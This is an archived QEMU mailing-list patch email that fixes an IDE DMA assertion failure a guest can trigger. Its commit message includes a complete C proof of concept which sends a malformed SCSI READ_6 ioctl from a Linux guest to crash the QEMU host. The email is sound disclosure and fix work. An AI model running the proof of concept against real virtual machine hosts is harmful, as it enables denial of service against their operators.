Return-Path: <SRS0=NHD5=ZG=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-9.7 required=3.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
	INCLUDES_PATCH,MAILING_LIST_MULTI,SIGNED_OFF_BY,SPF_HELO_NONE,SPF_PASS,
	URIBL_BLOCKED,USER_AGENT_GIT autolearn=ham autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id B2999C432C3
	for <qemu-devel@archiver.kernel.org>; Thu, 14 Nov 2019 17:29:09 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 81967206CC
	for <qemu-devel@archiver.kernel.org>; Thu, 14 Nov 2019 17:29:09 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 81967206CC
Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=linux.com
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([::1]:60248 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1iVIvc-00088l-OJ
	for qemu-devel@archiver.kernel.org; Thu, 14 Nov 2019 12:29:08 -0500
Received: from eggs.gnu.org ([2001:470:142:3::10]:33783)
 by lists.gnu.org with esmtp (Exim 4.90_1)
 (envelope-from <a13xp0p0v88@gmail.com>) id 1iVIuR-00072F-6M
 for qemu-devel@nongnu.org; Thu, 14 Nov 2019 12:27:56 -0500
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
 (envelope-from <a13xp0p0v88@gmail.com>) id 1iVIuQ-0001LL-0e
 for qemu-devel@nongnu.org; Thu, 14 Nov 2019 12:27:55 -0500
Received: from mail-lj1-f195.google.com ([209.85.208.195]:36851)
 by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
 (Exim 4.71) (envelope-from <a13xp0p0v88@gmail.com>)
 id 1iVIuM-0001FN-1A; Thu, 14 Nov 2019 12:27:50 -0500
Received: by mail-lj1-f195.google.com with SMTP id k15so7574232lja.3;
 Thu, 14 Nov 2019 09:27:49 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20161025;
 h=x-gm-message-state:from:to:subject:date:message-id:mime-version
 :content-transfer-encoding;
 bh=u6U4auc3+kGBAbtlPhPv7a7xPAKjNiKOvhAkoCwTOE0=;
 b=umzIloFbyJRISwqd34/tYPlEwZMj4QTQgU60P6iePG5b3dhfiQohvOjQ1PLztACP09
 T1iHDY8xXNifj/0fDPuQUSTgE95Fa3jPqwn8tg4O155OL7UlCunHRcQafyDwEfgYo4C1
 wxDPE7tB8rLUpzIMnt2y1StKPeQ9xNXZ2pvMeMA9WGhslo+SLyD0AT8zN1GiHXZwsHgr
 Z7MDSd39RsXrdHgE5MSwvRTORR1rGR8bXb4UFRPm6M6FvH3vOjggb41hjxsZu0MfhhWD
 iDutSjc9+vvx0igYDMrxo+ioWHvqPysYH5sY/cn4kN/cP5kK31gFH9LuWDejNmOK3ZjZ
 9kTw==
X-Gm-Message-State: APjAAAVgakfb9jkDAxo4Qft46wjd8HO5ihepl1oZCq5Omr56SkUJXcVh
 F+QQb9SWtLmF+y+ziu+JEds=
X-Google-Smtp-Source: APXvYqygrer3G4p/zc97tyQJiP1LithYuprVDFOnuLHg1YKZD9rdfoOcYU5SZFH2RSFo5d1hL+JGdw==
X-Received: by 2002:a2e:7a07:: with SMTP id v7mr7612588ljc.208.1573752468226; 
 Thu, 14 Nov 2019 09:27:48 -0800 (PST)
Received: from localhost.localdomain ([213.87.136.65])
 by smtp.gmail.com with ESMTPSA id u7sm2953559lfg.65.2019.11.14.09.27.46
 (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
 Thu, 14 Nov 2019 09:27:47 -0800 (PST)
From: Alexander Popov <alex.popov@linux.com>
To: "Michael S . Tsirkin" <mst@redhat.com>, John Snow <jsnow@redhat.com>,
 qemu-block@nongnu.org, qemu-devel@nongnu.org, qemu-stable@nongnu.org,
 pmatouse@redhat.com, sstabellini@kernel.org, mdroth@linux.vnet.ibm.com,
 pjp@redhat.com, Paolo Bonzini <pbonzini@redhat.com>,
 Andrea Arcangeli <aarcange@redhat.com>,
 Kashyap Chamarthy <kashyap.cv@gmail.com>,
 Alexander Popov <alex.popov@linux.com>
Subject: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to
 prevent qemu DoS from quests
Date: Thu, 14 Nov 2019 20:25:31 +0300
Message-Id: <20191114172531.10644-1-alex.popov@linux.com>
X-Mailer: git-send-email 2.21.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
 [fuzzy]
X-Received-From: 209.85.208.195
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
Precedence: list
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
 <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

The commit a718978ed58a from July 2015 introduced the assertion which
implies that the size of successful DMA transfers handled in ide_dma_cb()
should be multiple of 512 (the size of a sector). But guest systems can
initiate DMA transfers that don't fit this requirement.

PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
command and crash qemu:

#include <stdio.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <scsi/scsi.h>
#include <scsi/scsi_ioctl.h>

#define CMD_SIZE 2048

struct scsi_ioctl_cmd_6 {
	unsigned int inlen;
	unsigned int outlen;
	unsigned char cmd[6];
	unsigned char data[];
};

int main(void)
{
	intptr_t fd = 0;
	struct scsi_ioctl_cmd_6 *cmd = NULL;

	cmd = malloc(CMD_SIZE);
	if (!cmd) {
		perror("[-] malloc");
		return 1;
	}

	memset(cmd, 0, CMD_SIZE);
	cmd->inlen = 1337;
	cmd->cmd[0] = READ_6;

	fd = open("/dev/sg0", O_RDONLY);
	if (fd == -1) {
		perror("[-] opening sg");
		return 1;
	}

	printf("[+] sg0 is opened\n");

	printf("[.] qemu should break here:\n");
	fflush(stdout);
	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
	printf("[-] qemu didn't break\n");

	free(cmd);

	return 1;
}

For fixing that let's check the number of bytes prepared for the transfer
by the prepare_buf() handler. If it is not a multiple of 512 then end
the DMA transfer with an error.

That also fixes the I/O stall in guests after a DMA transfer request
for less than the size of a sector.

Signed-off-by: Alexander Popov <alex.popov@linux.com>
---
 hw/ide/core.c | 11 +++++------
 1 file changed, 5 insertions(+), 6 deletions(-)

diff --git a/hw/ide/core.c b/hw/ide/core.c
index 754ff4dc34..85aac614f0 100644
--- a/hw/ide/core.c
+++ b/hw/ide/core.c
@@ -849,6 +849,7 @@ static void ide_dma_cb(void *opaque, int ret)
     int64_t sector_num;
     uint64_t offset;
     bool stay_active = false;
+    int32_t prepared = 0;
 
     if (ret == -EINVAL) {
         ide_dma_error(s);
@@ -892,12 +893,10 @@ static void ide_dma_cb(void *opaque, int ret)
     n = s->nsector;
     s->io_buffer_index = 0;
     s->io_buffer_size = n * 512;
-    if (s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer_size) < 512) {
-        /* The PRDs were too short. Reset the Active bit, but don't raise an
-         * interrupt. */
-        s->status = READY_STAT | SEEK_STAT;
-        dma_buf_commit(s, 0);
-        goto eot;
+    prepared = s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer_size);
+    if (prepared % 512) {
+        ide_dma_error(s);
+        return;
     }
 
     trace_ide_dma_cb(s, sector_num, n, IDE_DMA_CMD_str(s->dma_cmd));
-- 
2.21.0


